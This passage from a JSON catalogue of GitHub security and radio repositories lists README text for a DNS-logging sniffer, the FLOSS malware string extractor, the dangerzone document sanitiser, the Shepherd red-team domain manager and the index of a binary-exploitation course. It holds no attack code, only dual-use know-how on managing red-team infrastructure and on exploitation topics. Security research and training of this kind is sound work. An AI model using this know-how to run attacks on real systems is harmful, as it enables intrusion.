POCs\\n- [Adam Ali Zare Hudaib](mailto:adamhudaib@gmail.com): Author of Satellite Network Hacking & Security Analysis\\n- [William Akoto](mailto:william@willakoto.com): Author of Hackers could shut down satellites \\u2014 or turn them into weapons\\n- [LT COL Stephen Bichler](mailto:stephen.bichler@us.af.mil): Author of MITIGATING CYBER SECURITY RISK IN SATELLITE GROUND SYSTEMS\\n- [Gregory Falco](mailto:falco@stanford.edu): Author of Cybersecurity Principles for Space Systems\\n\\n### Defense Digital Service Library Custodians\\n- Clair Koroma (clair@dds.mil)\\n- Daniel Allen (dan@dds.mil)\\n- Nick Ashworth (nick.ashworth@dds.mil)\\n\\n## *Also check out our [Aviation Hacking Resource Library](https://github.com/deptofdefense/hack-aviation-library/blob/master/README.md)*\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n![Space Security Challeng 2020 Footer Logo](./graphics/DDShackasatlogobottom.png \\\"Space Security Challeng 2020 Logo\\\")\\n\"", "topics": [], "writeup": "Public library of space documents, tutorials, and resources for budding satellite hackers", "ignoredescription": false, "id": 14, "full_name": "deptofdefense/hack-a-sat-library", "url": "https://github.com/deptofdefense/hack-a-sat-library"},
{"tags": ["dns", "logging", "sniffer"], "owner": "droberson", "description": "DNS logging, detection, ...", "name": "greylost", "topics_string": "dns logging sniffer", "language": "Python", "readme": "\"# Greylost\\n\\nThis sniffs DNS traffic and logs queries. It implements a time-based\\nfilter to narrow the scope of DNS logs for analysts to examine; if\\ntraffic to Google is typical for your environment, you won't be\\ninnundated with these query logs, but WILL get logs for\\nmalwaredomain123.xyz if that is an atypical query.\\n\\nThis can be installed locally, on a resolver/forwarder, or on a\\nmachine plugged into a switchport that is mirroring ports.\\n\\n## Installation\\n```\\npip3 install -r requirements.txt\\n```\\n\\n## Usage:\\n```\\nusage: greylost.py [-h] [--alllog ALLLOG] [--notdnslog NOTDNSLOG]\\n [--greylistmisslog GREYLISTMISSLOG] [-b BPF] [-d]\\n [--learningtime LEARNINGTIME] [--logging] [--ignore IGNORE]\\n [-i INTERFACE] [-o] [-p PRECISION] [-r PIDFILE]\\n [-s FILTERSIZE] [-t FILTERTIME] [-v] [-w DUMPFILE]\\n\\ngreylost by @dmfroberson\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n --alllog ALLLOG /path/to/all-log -- log of all DNS queries\\n --notdnslog NOTDNSLOG\\n /path/to/not-dns-log -- log of non-DNS protocol\\n traffic\\n --greylistmisslog GREYLISTMISSLOG\\n /path/to/greylist-miss-log -- log of greylist misses\\n -b BPF, --bpf BPF BPF filter to apply to the sniffer\\n -d, --daemonize Daemonize\\n --learningtime LEARNINGTIME\\n Time to baseline queries before alerting on greylist\\n misses\\n --logging Toggle logging\\n --ignore IGNORE File containing list of domains to ignore when\\n greylisting\\n -i INTERFACE, --interface INTERFACE\\n Interface to sniff\\n -o, --stdout Toggle stdout output\\n -p PRECISION, --precision PRECISION\\n Precision of bloom filter. Ex: 0.001\\n -r PIDFILE, --pidfile PIDFILE\\n Path to PID file\\n -s FILTERSIZE, --filtersize FILTERSIZE\\n Size of bloom filter\\n -t FILTERTIME, --filtertime FILTERTIME\\n Filter time\\n -v, --verbose increase verbosity\\n -w DUMPFILE, --dumpfile DUMPFILE\\n Write captured packets to a dumpfile\\n```\\n\\nExample:\\n```\\n./greylost.py -i eth0 --stdout --logging\\n```\\n\\n## Splunk\\nThe JSON logs provided by greylost can be indexed by Splunk.\\n\\n### Quickstart\\nAdd indexes:\\n```\\ngreylost-all\\ngreylost-misses\\ngreylost-malware\\n```\\n\\nAssuming you have Universal Forwarder installed and configured:\\n```\\nsplunk add monitor /path/to/greylost-all.log -index greylost-all\\nsplunk add monitor /path/to/greylost-misses.log -index greylost-misses\\nsplunk add monitor /path/to/greylost-malware.log -index greylost-malware\\nsplunk add monitor /path/to/greylost-notdns.log -index greylost-notdns\\n```\\n\\n### Searching\\nNo dashboards or application exists (yet), but here are some queries\\nI've found useful:\\n\\nSearch for resolutions of _malware.com_:\\n```\\nindex=greylost-all \\\"questions{}.qname\\\"=\\\"malware.com.\\\"\\n```\\n\\nCounts of queries per host:\\n```\\nindex=greylost-misses | chart count by saddr\\n```\\n\\nCounts of query types:\\n```\\nindex=greylost-misses |chart count by \\\"questions{}.qtype\\\"\\n```\\n\\nHosts sending non-DNS traffic:\\n```\\nindex=greylost-notdns | chart count by saddr\\n```\\n\\nHosts querying lots of TXT records:\\n```\\nindex=greylost-misses \\\"questions{}.qtype\\\"=TXT | chart count by saddr\\n```\"", "topics": [], "writeup": "sniffs DNS traffic and logs queries. It implements a time-based filter to narrow the scope of DNS logs for analysts to examine; if traffic to Google is typical for your environment, you won't be innundated with these query logs, but WILL get logs for malwaredomain123.xyz if that is an atypical query. This can be installed locally, on a resolver/forwarder, or on a machine plugged into a switchport that is mirroring ports.\n", "ignoredescription": false, "id": 15, "full_name": "droberson/greylost", "url": "https://github.com/droberson/greylost"},
{"tags": ["sdr", "p25"], "owner": "DSheirer", "description": "A cross-platform java application for decoding, monitoring, recording and streaming trunked mobile and related radio protocols using Software Defined Radios (SDR).  Website:", "name": "sdrtrunk", "topics_string": "sdr p25", "language": "Java", "readme": "\"# sdrtrunk\\nA cross-platform java application for decoding, monitoring, recording and streaming trunked mobile and related radio protocols using Software Defined Radios (SDR).\\n\\n* [Getting Started](https://github.com/DSheirer/sdrtrunk/wiki/GettingStarted_V0.3.0)\\n* [User's Manual Version 0.3.0 and 0.4.0](https://github.com/DSheirer/sdrtrunk/wiki/UserManual_V0.3.0)\\n* [Playlist Editor User Manual Version 0.5.0](https://github.com/DSheirer/sdrtrunk/wiki/Playlist-Editor)\\n* [Download](https://github.com/DSheirer/sdrtrunk/releases)\\n* [Support Group](https://groups.google.com/forum/#!forum/sdrtrunk)\\n* [Discord Support Channel](https://discord.gg/HJQaKYE)\\n\\n![sdrtrunk Application Overview - Version 0.3.0](https://github.com/DSheirer/sdrtrunk/wiki/v0.3/images/ApplicationOverview_V0.3.0.png)\\n**Figure 1:** sdrtrunk **Version 0.3.0** Application Screenshot\\n\\n# End User Instructions:\\n\\nIf you simply want to download and run the program, please follow these instructions.\\n\\n## Download the latest sdrtrunk release for your operating system\\n \\nAll release versions of sdrtrunk are available from the [releases](https://github.com/DSheirer/sdrtrunk/releases) tab.\\n\\n* **(alpha)** These versions are under development feature previews and likely to contain bugs and unexpected behavior.\\n* **(beta)** These versions are currently being tested for bugs and functionality prior to final release.\\n* **(final)** These versions have been tested and are the current release version.\\n\\n## Unzip the release\\n\\nUse 7-zip or any zip utility to unzip the release file\\n\\n## Start the application\\n\\nOnce unzipped, open a command prompt to where you unzipped the release. Change to the **/bin** directory and use the launch script to start the application:\\n* **Windows** sdr-trunk.bat\\n* **Linux/OSX** ./sdr-trunk\\n\\n## Optional - P25 Audio\\nIf you're using sdrtrunk with a P25 trunked radio system, the [JMBE](https://github.com/DSheirer/sdrtrunk/wiki/JMBE) wiki page contains instructions for downloading the JMBE audio library source code and compiling the JMBE library. Once you have compiled the library, launch the sdrtrunk application. From the menu bar, choose **View >> Preferences**. In the **JMBE Audio Codec** section, update the path to where your compiled JMBE library is located. Any channels that are started after you set the path will be able to produce P25 audio.\\n\\n## Minimum System Requirements\\n* **Operating System:** Windows (~~32 or~~ 64-bit), Linux (~~32 or~~ 64-bit) or Mac/Linux (64-bit, 10.14 or higher)\\n* **CPU:** 4-core\\n* **RAM:** 8GB or more (preferred). Depending on usage, 4GB may be sufficient.\\n\\n# Developer Instructions:\\n\\nIf you're interested in modifying and/or compiling the source code, please follow these instructions to use gradle to compile the code. \\n\\n## Build the project\\nsdrtrunk uses the gradle build system. This requires OpenJDK 11 or higher installed on your local compuber. Use the gradle wrapper to build the source code:\\n\\n### Linux\\n```\\n./gradlew clean build\\n```\\n### Windows\\n```\\ngradlew.bat clean build\\n```\\n\\nThe **/build/distributions** folder will contain the zip file of the compiled program. Unzip it and launch the program from the scripts in the **/bin** directory.\\n\\n## Development\\nAll dependencies/versions are controlled from build.gradle.\\nTo change the new release version tag of artifact - change property:\\n```\\nversion = '0.5.0'\\n```\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 16, "full_name": "DSheirer/sdrtrunk", "url": "https://github.com/DSheirer/sdrtrunk"},
{"tags": ["re"], "owner": "fireeye", "description": "FireEye Labs Obfuscated String Solver - Automatically extract obfuscated strings from malware.", "name": "flare-floss", "topics_string": "deobfuscation fireeye-flare malware strings re", "language": "Python", "readme": "\"[![Appveyor Build Status](https://ci.appveyor.com/api/projects/status/github/fireeye/flare-floss?branch=master&svg=true)](https://ci.appveyor.com/project/williballenthin/flare-floss)\\n[![Travis Build Status](https://travis-ci.org/fireeye/flare-floss.svg?branch=master)](https://travis-ci.org/fireeye/flare-floss)\\n\\n\\n<img src=\\\"resources/logo.png?raw=true \\\" width=\\\"350\\\"/>\\n\\n# FireEye Labs Obfuscated String Solver\\n\\nRather than heavily protecting backdoors with hardcore packers, many\\nmalware authors evade heuristic detections by obfuscating only key\\nportions of an executable. Often, these portions are strings and resources\\nused to configure domains, files, and other artifacts of an infection.\\nThese key features will not show up as plaintext in output of the `strings.exe` utility\\nthat we commonly use during basic static analysis.\\n\\nThe FireEye Labs Obfuscated String Solver (FLOSS) uses advanced\\nstatic analysis techniques to automatically deobfuscate strings from\\nmalware binaries. You can use it just like `strings.exe` to enhance\\nbasic static analysis of unknown binaries.\\n\\nPlease review the theory behind FLOSS [here](doc/theory.md).\\n\\n\\n## Quick Run\\nTo try FLOSS right away, download a standalone executable file from the releases page:\\nhttps://github.com/fireeye/flare-floss/releases\\n\\nFor a detailed description of *installing* FLOSS, review the documention\\n [here](doc/installation.md).\\n\\nStandalone nightly builds:\\n - Windows 64bit: [here](http://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/appveyor/dist/floss64.exe) \\n - Windows 32bit: [here](http://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/appveyor/dist/floss32.exe)\\n - Linux: [here](https://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/travis/linux/dist/floss)\\n - OSX: [here](https://s3.amazonaws.com/build-artifacts.floss.flare.fireeye.com/travis/osx/dist/floss)\\n\\n\\n## Usage\\nExtract obfuscated strings from a malware binary:\\n\\n $ floss /path/to/malware/binary\\n\\nDisplay the help/usage screen to see all available switches.\\n\\n $ ./floss -h\\n\\nFor a detailed description of *using* FLOSS, review the documention\\n [here](doc/usage.md).\\n\\nFor a detailed description of *testing* FLOSS, review the documention\\n [here](doc/test.md).\\n\\n## Sample Output\\n\\n```\\n$ floss malware.bin\\nFLOSS static ASCII strings\\n!This program cannot be run in DOS mode.\\n_YY\\nRichYY\\nMdfQ\\n.text\\n`.rdata\\n@.data\\n.idata\\n.didat\\n.reloc\\nU F\\n?;}\\nA@;E\\n_^[\\nHttHt-H\\n'9U\\nWS2_32.dll\\nFreeLibrary\\nGetProcAddress\\nLoadLibraryA\\nGetModuleHandleA\\nGetVersionExA\\nMultiByteToWideChar\\nWideCharToMultiByte\\nSleep\\nGetLastError\\nDeleteFileA\\nWriteFile\\n[..snip...]\\n\\nFLOSS static UTF-16 strings\\n,%d\\n\\nFLOSS decoded 4 strings\\nWinSta0\\\\Default\\nSoftware\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet Settings\\nProxyEnable\\nProxyServer\\n\\nFLOSS extracted 81 stack strings\\nWinSta0\\\\Default\\n'%s' executed.\\nERR '%s' error[%d].\\nSoftware\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet Settings\\nProxyEnable\\nProxyServer\\nwininet.dll\\nInternetOpenA\\n0\\\\A4\\nInternetSetOptionA\\nInternetConnectA\\nInternetQueryOptionA\\nMozilla/4.0 (compatible; MSIE 7.0; Win32)\\n-ERR\\nFILE(%s) wrote(%d).\\nInvalid ojbect.\\nSetFilepoint error[%d].\\nb64_ntop error[%d].\\nGetFileSize error[%d].\\nCreates file error[%d].\\nKCeID5Y/96QTJc1pzi0ZhEBqVG83OnXaL+oxsRdymHS4bFgl7UrWfP2v=wtjNukM\\n[..snip...]\\n```\\n\"", "topics": ["deobfuscation", "fireeye-flare", "malware", "strings"], "writeup": "", "ignoredescription": false, "id": 17, "full_name": "fireeye/flare-floss", "url": "https://github.com/fireeye/flare-floss"},
{"tags": ["docker"], "owner": "firstlookmedia", "description": "Take potentially dangerous PDFs, office documents, or images and convert them to a safe PDF", "name": "dangerzone", "topics_string": "docker", "language": "Python", "readme": "\"# dangerzone\\n\\nTake potentially dangerous PDFs, office documents, or images and convert them to a safe PDF.\\n\\n![Screenshot](./assets/screenshot.png)\\n\\nDangerzone works like this: You give it a document that you don't know if you can trust (for example, an email attachment). Inside of a sandbox, dangerzone converts the document to a PDF (if it isn't already one), and then converts the PDF into raw pixel data: a huge list of of RGB color values for each page. Then, in a separate sandbox, dangerzone takes this pixel data and converts it back into a PDF.\\n\\n_Read more about dangerzone in the blog post [Dangerzone: Working With Suspicious Documents Without Getting Hacked](https://tech.firstlook.media/dangerzone-working-with-suspicious-documents-without-getting-hacked)._\\n\\n## Getting started\\n\\n- Download [dangerzone 0.1.1 for Mac](https://github.com/firstlookmedia/dangerzone/releases/download/v0.1.1/Dangerzone.0.1.1.dmg)\\n- Download [dangerzone 0.1.1 for Windows](https://github.com/firstlookmedia/dangerzone/releases/download/v0.1.1/Dangerzone.0.1.1.msi)\\n- See [installing dangerzone](https://github.com/firstlookmedia/dangerzone/wiki/Installing-Dangerzone) on the wiki for Linux repositories\\n\\nYou can also install dangerzone for Mac using [Homebrew](https://brew.sh/): `brew cask install dangerzone`\\n\\n## Some features\\n\\n- Sandboxes don't have network access, so if a malicious document can compromise one, it can't phone home\\n- Dangerzone can optionally OCR the safe PDFs it creates, so it will have a text layer again\\n- Dangerzone compresses the safe PDF to reduce file size\\n- After converting, dangerzone lets you open the safe PDF in the PDF viewer of your choice, which allows you to open PDFs and office docs in dangerzone by default so you never accidentally open a dangerous document\\n\\nDangerzone can convert these types of document into safe PDFs:\\n\\n- PDF (`.pdf`)\\n- Microsoft Word (`.docx`, `.doc`)\\n- Microsoft Excel (`.xlsx`, `.xls`)\\n- Microsoft PowerPoint (`.pptx`, `.ppt`)\\n- ODF Text (`.odt`)\\n- ODF Spreadsheet (`.ods`)\\n- ODF Presentation (`.odp`)\\n- ODF Graphics (`.odg`)\\n- Jpeg (`.jpg`, `.jpeg`)\\n- GIF (`.gif`)\\n- PNG (`.png`)\\n- TIFF (`.tif`, `.tiff`)\\n\\nDangerzone was inspired by [Qubes trusted PDF](https://blog.invisiblethings.org/2013/02/21/converting-untrusted-pdfs-into-trusted.html), but it works in non-Qubes operating systems. It uses containers as sandboxes instead of virtual machines (using Docker for macOS, Windows, and Debian/Ubuntu, and [podman](https://podman.io/) for Fedora).\\n\\nSet up a development environment by following [these instructions](/BUILD.md).\\n\\nThe git repository for the container is called [dangerzone-converter](https://github.com/firstlookmedia/dangerzone-converter).\"", "topics": [], "writeup": "Dangerzone works like this: You give it a document that you don't know if you can trust (for example, an email attachment). Inside of a sandbox, dangerzone converts the document to a PDF (if it isn't already one), and then converts the PDF into raw pixel data: a huge list of of RGB color values for each page. Then, in a separate sandbox, dangerzone takes this pixel data and converts it back into a PDF.\n", "ignoredescription": false, "id": 18, "full_name": "firstlookmedia/dangerzone", "url": "https://github.com/firstlookmedia/dangerzone"},
{"tags": ["redteam", "dns", "infra"], "owner": "GhostManager", "description": "A Django application to help red team operators manage a library of domain names", "name": "Shepherd", "topics_string": "redteam dns infra", "language": "Python", "readme": "\"# Shepherd\\n\\n[![Python Version](https://img.shields.io/badge/Python-3.7-brightgreen.svg)](.) [![License](https://img.shields.io/badge/License-BSD3-darkred.svg)](.)\\n\\n![Shepherd](https://github.com/GhostManager/Shepherd/raw/master/Shepherd.jpg)\\n\\nShepherd is a Django application written in Python 3.7 and is designed to be used by a team of operators. It keeps track of domain names and each domain's current DNS settings, categorization, project history, and status. The tracked statuses include which domains are: ready to be used, burned/retired, or in use, and which team member checked out each of the active domains.\\n\\nMore information is available here: https://medium.com/@cmaddy/being-a-good-domain-shepherd-part-2-5e8597c3fe63\\n\\n## Installation\\n\\nShepherd requires Redis server and Python 3.7. Install these before proceeding. The exact steps will depend on your operating system, but should be as simple as using an `apt install` or `brew install` command.\\n\\n### Installing Libraries\\n\\nAll of Shepherd's Python/Django dependencies are documented in the Pipfile. It is easiest to setup and use a virtual environment using `pipenv`. This is the best option for managing the required libraries and to avoid Python installations getting mixed-up.\\n\\nDo this:\\n\\n1. Run: `pip3 install --user pipenv` or `python3 -m pip install --user pipenv`\\n2. Run: `git clone https://github.com/GhostManager/Shepherd.git`\\n3. Run: cd Shepherd && pipenv install\\n4. Start using Shepherd by running: pipenv shell\\n\\n### Adjusting Settings.py\\n\\nOnce Django and the other Python libraries are installed, open Shepherd's settings.py file and direct your attention to the `SECRET_KEY` and `DEBUG` variables. You can set `DEBUG` to `True` if you want to test Shepherd or make some changes. It is a good idea to set this to `False` in production, even though Shepherd _should_ only be used as an internal resource.\\n\\nThe `SECRET_KEY` variable is set to `changeme`. Feel free to generate something and drop it in or use an environment variable. It's usually something like `cg#p$g+j9tax!#a3cup@1$8obt2_+&k3q+pmu)5%asj6yjpkag`.\\n\\n### Additional Settings\\n\\n#### API Configuration\\n\\nSettings.py also stores API information for a few functions. One of Shepherd's core features is updating domain \\\"health\\\" data (more on that below). This uses web requests and part of it uses the VirusTotal API. If you do not have one, get a free API key from VirusTotal. Once you have your key add it to the `DOMAINCHECK_CONFIG` settings.\\n\\nIf you have a paid VirusTotal license and are not subject to the 4 requests per minute limit you can play with the `sleep_time` setting. A 20 second `sleep_time` is still recommended to avoid spewing web requests so fast that your IP address gets blocked with reCAPTCHAs, but you can try reducing it.\\n\\n#### Slack Configuration\\n\\nThere is also a `SLACK_CONFIG` settings dictionary. If you have, or can get, a Slack Incoming Webhook you can configure that here to receive some messages when tasks are completed or domains are burned.\\n\\nYou can set a username and emoji for the bot. Emojis must be set using Slack syntax like `:sheep:`. The username can be anything you could use for a Slack username. The emoji will appear as the bot's avatar in channels.\\n\\nThe alert target is the message target. You can set this to a blank string, e.g. `''`, but it's mostly useful for targeting users, aliases, or @here/@channel. They must be written as `<!here>`, `<!channel>`, or `<@username>` for them to work as actual notification keywords.\\n\\nFinally, set the target channel. This might be your `#general` or some other channel. This is the global value that will be used for all messages unless another value is supplied. Currently only the global value from settings.py is used but in the future there will be messages sent for specific projects and events. For example, when a domain is checked-out for use the user can specify a Slack channel to use for notifications and a future version of Shepherd, currently in the works, will use that channel to send project_related notifications to the provided the channel.\\n\\nIf you do not want to use Slack change `enable_slack` to `False`.\\n\\nOther notification options are coming soon. Email and services such as Pushover are being considered.\\n\\n### Database Setup\\n\\nNext, the database tables must be migrated. This configures all of Shepherd's database models from the code in models.py to actual tables:\\n\\nTo setup the database run: `python3 manage.py migrate`\\n\\nAssuming that completed successfully, you need to pre-populate a few of Shepherd's database models with some data. These are just some basic domain statuses and project types. You can add your own as desired later.\\n\\nTo initiate settings run: `python3 manage.py loaddata catalog/fixtures/initial_values.json`\\n\\n### Start Django\\n\\nA super user must now be created to access the admin panel and create new users and groups. This is the administrator of Shepherd, so set a strong password and document it in a password vault somewhere.\\n\\nTo create a superuser run: `python manage.py createsuperuser`\\n\\nFinally, try starting the server and accessing the admin panel.\\n\\nTo start the server run: `python3 manage.py runserver`\\n\\nVisit SERVER_IP:8000/admin to view the admin panel and login using the superuser.\\n\\n### Creating New Users\\n\\nCreate your users using the admin panel. Filling out a complete profile is recommended.\\n\\nIn cases where Shepherd records a user action the usernames are used rather than first or last names, but Shepherd does display the user's full name in the corner if it is available. Also, usernames are weirdly case sensitive, so all lowercase is recommended to avoid confusion later.\\n\\nEmail addresses are not important at the present time, but this will change. Shepherd will use email addresses for password recovery, but the email server is not baked into Shepherd right now. Emails will just appear in the terminal and that is where the user or an administrator can get their password reset link.\\n\\nIn the future, email addresses will be displayed as a means of contacting the operator using a particular domain for domain and project questions. Email may also ne used to send notifications.\\n\\n### Creating New Groups\\n\\nGroups are a good way to organize user permissions. Shepherd will make a couple of functions available to a \\\"Senior Operators\\\" group, including editing a domain's information. To use this functionality create two groups named \\\"Operators\\\" and \\\"Senior Operators\\\" in the admin panel.\\n\\nOnly mark users as \\\"Staff\\\" if you want them to be able to access the Django admin panel. It is better to leave the admin panel alone for day-to-day work and it should not be required except to fix a problem or directly edit the database for some reason, so users do not require this access.\\n\\n### Start Django Q and Redis\\n\\nOnce you are ready to actually use Shepherd start your Redis server. You also need to start Django Q's `qcluster` which will need to be done using another terminal window with manage.py, just like starting the server.\\n\\nRun this: `python3 manage.py qcluster`\\n\\nIf Redis is running on a different server, you changed the port, or made some other modification, you will need to update the Redis configuration in settings.py. You could also switch to a different broker if you already have some other broker setup and would prefer to use it for Shepherd. Check Django Q's documentation to make the changes in settings.py to switch to Rabbit MQ, Amazon SQS, or whatever else you might be using.\\n\\n### Schedule Tasks\\n\\nVisit the Django Q database from the admin panel and check the Scheduled tasks. You may wish to create a scheduled task to automatically release domains at the end of a project. Shepherd has a task for this, `tasks.release_domains`, which you can schedule whenever you please, like every morning at 01:00.\\n\\n## Notes on Health\\n\\nShepherd grades a domain's health as Healthy or Burned. Health is reported as an overall health grade and a separate grade for the domain's DNS. You will almost certainly see a `Healthy` domain with questionable DNS. This is not something to be worried about without some human investigation. The DNS is based on VirusTotal's passive DNS report and checking to see if the IP addresses have appeared in any threat reports. If you bought an expired domain it's not at all strange to learn it once pointed at a cloud IP address that was flagged for something naughty at some point.\\n\\nCheck to see if the IP addresses in question are yours. If they are not then you can probably ignore this. If the IP address was flagged very recently, like just before you bought the domain, then that may be a concern because the domain may be flagged for recent malicious activity. There's a lot of \\\"maybes\\\" here because this is very much an imperfect grade.\\n\\nIn general, focus on the overall health status (based on categories) and just use the passive DNS information and flags to help with manual analysis of your domains.\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 19, "full_name": "GhostManager/Shepherd", "url": "https://github.com/GhostManager/Shepherd"},
{"tags": ["windows", "reverse-engineering", "re"], "owner": "glmcdona", "description": "strings2: An improved strings extraction tool.", "name": "strings2", "topics_string": "windows reverse-engineering re", "language": "C++", "readme": "\"# strings2\\nStrings2 is a Windows 32bit and 64bit command-line tool for extracting strings from binary data. On top of the classical Sysinternals strings approach, this improved version is also able to dump strings from process address spaces and also reconstructs hidden assembly local variable assignment ASCII/unicode strings. Currently, the ASM-string extracting approach only supports the x86 instruction set.\\n\\nI am maintaining a public binary release download page for this project at:\\n http://split-code.com/strings2.html\\n\\n\\n## Flags\\nThe command-line flags for strings2 are as follows:\\n\\n\\t -f\\n\\tPrints the filename/processname before each string.\\n\\t\\n\\t -r\\n\\tRecursively process subdirectories.\\n\\t\\n\\t -t\\n\\tPrints the type before each string. Unicode,\\n\\tASCII, or assembly unicode/ASCII stack push.\\n\\t\\n\\t -asm\\n\\tOnly prints the extracted ASCII/unicode\\n\\tassembly stack push-hidden strings.\\n\\t\\n\\t -raw\\n\\tOnly prints the regular ASCII/unicode strings.\\n\\t\\n\\t -l [numchars]\\n\\tMinimum number of characters that is\\n\\ta valid string. Default is 4.\\n\\t\\n\\t -nh\\n\\tNo header is printed in the output.\\n\\t\\n\\t -pid\\n\\tThe strings from the process address space for the\\n\\tspecified PID will be dumped. Use a '0x' prefix to\\n\\tspecify a hex PID.\\n\\t \\n\\t -system\\n\\tDumps strings from all accessible processes on the\\n\\tsystem. This takes awhile.\\n\\n\\t\\t\\n## Example Usage\\nFrom the command prompt:\\n* strings2 malware.exe\\n* strings2 *.exe > strings.txt\\n* strings2 *.exe -nh -f -t -asm > strings.txt\\n* strings2 -pid 419 > process_strings.txt\\n* strings2 -pid 0x1a3 > process_strings.txt\\n* strings2 -system > all_process_strings.txt\\n* cat abcd.exe | strings2 > out.txt\\n\\n\\n## Contributing\\nContributions are welcome. Some possible contribution directions are as follows:\\n* Only print unique strings.\\n* Add flag support for dumping process strings by process/window title matching.\\n* Add x64 assembly support for extracting ASM stack pushed strings.\\n\"", "topics": [], "writeup": "Strings2 is a Windows 32bit and 64bit command-line tool for extracting strings from binary data. On top of the classical Sysinternals strings approach, this improved version is also able to dump strings from process address spaces and also reconstructs hidden assembly local variable assignment ASCII/unicode strings. Currently, the ASM-string extracting approach only supports the x86 instruction set.", "ignoredescription": false, "id": 20, "full_name": "glmcdona/strings2", "url": "https://github.com/glmcdona/strings2"},
{"tags": ["course", "reverse-engineering", "re", "exploit-dev", "exploit", "training"], "owner": "guyinatuxedo", "description": "", "name": "nightmare", "topics_string": "course reverse-engineering re exploit-dev exploit training", "language": "Python", "readme": "\"# Nightmare\\n\\nNightmare is an intro to binary exploitation / reverse engineering course based around ctf challenges. I call it that because it's a lot of people's nightmare to get hit by weaponized 0 days, which these skills directly translate into doing that type of work (plus it's a really cool song).\\n\\n## What makes Nightmare different?\\n\\nIt's true there are a lot of resources out there to learn binary exploitation / reverse engineering skills, so what makes this different?\\n\\n```\\n* Amount of Content - There is a large amount of content in this course (currently over 90 challenges), laid out in a linear fashion.\\n\\n* Well Documented Write Ups - Each challenge comes with a well documented writeup explaining how to go from being handed the binary to doing the exploit dev.\\n\\n* Multiple Problems per Topic - Most modules have multiple different challenges. This way you can use one to learn how the attack works, and then apply it to the others. Also different iterations of the problem will have knowledge needed to solve it.\\n\\n* Using all open source tools - All the tools used here are free and open sourced. No IDA torrent needed.\\n\\n* A Place to Ask Questions - So if you have a problem that you've been working for days and can't get anywhere (and google isn't helping).\\n```\\n\\nI have found that resources that have many of these things to be few and far between. As a result it can make learning these skills difficult since you don't really know what to learn, or how to learn it. This is essentially my attempt to help fix some of those problems.\\n## Static Site\\n\\nIf you want, there is a static github pages site which people say looks better: https://guyinatuxedo.github.io/\\n\\n## Github\\n\\nA copy of all of the challenges listed, can be found on the github: https://github.com/guyinatuxedo/nightmare\\n\\n## Special Thanks\\n\\nSpecial thanks to these people:\\n\\n```\\nnoopnoop - For dealing with me\\ndigitalcold - For showing me how good nightmare could look with mdbook\\nyou nerds - For looking at this\\n```\\n\\n## Discord\\n\\nIf you get stuck on something for hours on end and google can't answer your question, try asking in the discord (or if you just feel like talking about cool security things). Here is a link to it `https://discord.gg/p5E3VZF`\\n\\nAlso if you notice any typos or mistakes, feel free to mention it in the Discord. With how much content is here, there is bound to be at least one.\\n\\n# Index\\n\\nHere is the index for all of the content in this course. Feel free to go through the whole thing, or only parts of it (don't let me tell you how to live your life). For the order that you do the challenges in a module, I would recommend starting with the first.\\n\\n\\n## Intro Departure\\n\\n#### 0.) Intro to the Project \\n\\n#### 1.) Intro to Assembly \\n- Intro to assembly\\n- Sample assembly reverse challs\\n\\n#### 2.) Intro to Tooling \\n- gdb-gef \\n- pwntools\\n- ghidra\\n\\n#### 3.) Beginner RE \\n- pico18_strings \\n- helithumper_re\\n- csaw18_tourofx86pt1 \\n- csaw19_beleaf\\n\\n## Stack pt 0 Stack Tendencies\\n\\n#### 4.) Buffer Overflow of Variables\\n\\n- Csaw18/boi\\n- TokyoWesterns17/just_do_it\\n- Tamu19_pwn1\\n\\n#### 5.) Buffer Overflow Call Function\\n- Csaw18_getit \\n- Tu17_vulnchat\\n- Csaw16_warmup\\n\\n#### 5.1) aslr/pie intro \\n- quick aslr/pie explanation\\n\\n#### 6.) Buffer Overflow Call Shellcode\\n- Tamu19_pwn3 \\n- Csaw17_pilot\\n- Tu18_shelleasy \\n\\n#### 6.1) nx intro \\n- nx explanation\\n\\n#### 7.) ROP Chain Statically compiled\\n- dcquals19_speedrun1\\n- bkp16_simplecalc\\n- dcquals16_feedme\\n\\n#### 7.1) stack canary intro \\n- stack canary introduction\\n\\n#### 7.2) relro intro \\n- relro introduction\\n\\n#### 8.) ROP Dynamically Compiled\\n- csaw17_svc \\n- fb19_overfloat \\n- hs19_storytime \\n- csaw19_babyboi\\n- utc19_shellme\\n\\n## General pt 0 Stardust Challenges\\n\\n#### 9.) Bad Seed \\n- h3_time \\n- hsctf19_tuxtalkshow \\n- sunshinectf17_prepared \\n\\n\\n#### 10.) Format strings \\n- backdoor17_bbpwn \\n- twesterns16_greeting\\n- pico_echo\\n- watevr19_betstar\\n\\n#### 11.) Index Array \\n- dcquals16_xkcd\\n- sawmpctf19_dreamheaps\\n- sunshinectf2017_alternativesolution\\n\\n#### 12.) Z3 \\n- tokyowesterns17_revrevrev \\n- tuctf_future \\n- hsctf19_abyte \\n\\n#### 13.) Angr \\n- securityfest_fairlight \\n- plaid19_icancount\\n- defcamp15_r100\\n\\n## Stack pt 1 Return to Stack, truly a perfect game\\n\\n#### 14.) Ret2system \\n- asis17_marymorton \\n- hxp18_poorcanary \\n- tu_guestbook\\n\\n#### 15.) Partial Overwrite \\n- Tu17_vulnchat2 \\n- Tamu19_pwn2\\n- hacklu15_stackstuff\\n\\n#### 16.) SROP \\n- backdoorctf_funsignals \\n- inctf17_stupiddrop\\n- swamp19_syscaller\\n- csaw19_smallboi\\n\\n#### 17.) Stack Pivot / Partial Overwrite\\n- defconquals19_speedrun4\\n- insomnihack18_onewrite\\n- xctf16_b0verfl0w\\n\\n#### 18.) Ret2Csu / Ret2dl \\n- ropemporium_ret2csu\\n- 0ctf 2018 babystack\\n\\n## General pt 1 Armstrong challenges\\n\\n#### 19.) Shellcoding pt 1 \\n- defconquals19_s3 \\n- Csaw18_shellpointcode\\n- defconquals19_s6\\n\\n#### 20.) Patching/Jumping \\n- dcquals18_elfcrumble \\n- plaid19_plaid_part_planning_III \\n- csaw16_gametime \\n\\n\\n#### 21.) .NET Reversing \\n- csaw13_dotnet \\n- 